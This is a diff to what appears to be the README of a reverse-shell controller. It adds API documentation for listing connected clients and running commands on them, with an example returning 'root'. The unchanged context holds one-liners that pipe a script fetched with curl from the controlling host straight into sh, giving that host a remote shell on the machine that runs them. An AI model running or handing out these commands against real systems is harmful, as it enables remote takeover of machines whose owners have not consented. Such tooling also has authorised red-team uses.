@@ -75,5 +75,25 @@ sh -c "$(curl http://host:port/attacker-host/attacker-port)"
 sh -c "$(curl http://host:port/)"
 ```
 
+#### RESTful API
+* GET `/client` List all online clients
+```
+# curl 'http://127.0.0.1:9090/client'
+{
+    "msg": [
+        "127.0.0.1:54798"
+    ],
+    "status": true
+}
+```
+* POST `/client` execute a command on a specific client
+```
+# curl -X POST 'http://host:port/client/4f571d895f019702e017658f2246a7eb' --data 'cmd=whoami'
+{
+    "status": true,
+    "msg": "root\n",
+}
+```
+
 #### TODO
 - [ ] More interfaces in RESTful API
